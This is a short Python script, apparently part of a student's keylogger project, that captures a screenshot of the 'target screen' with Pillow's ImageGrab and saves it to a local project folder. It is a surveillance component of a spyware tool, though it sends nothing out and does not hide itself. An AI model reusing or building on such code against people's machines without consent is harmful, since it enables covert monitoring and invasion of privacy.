# Pillow module allows importation of Imagegrab to easily capture screenshots of target screen
from PIL import ImageGrab

file_path = "C:\\Users\\Bryce\\PycharmProjects\\Project 4 - Keylogger\\Pieces\\Screenshot"
extend = "\\"
file_merge = file_path + extend

screenshot_information = "screenshot.png"

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()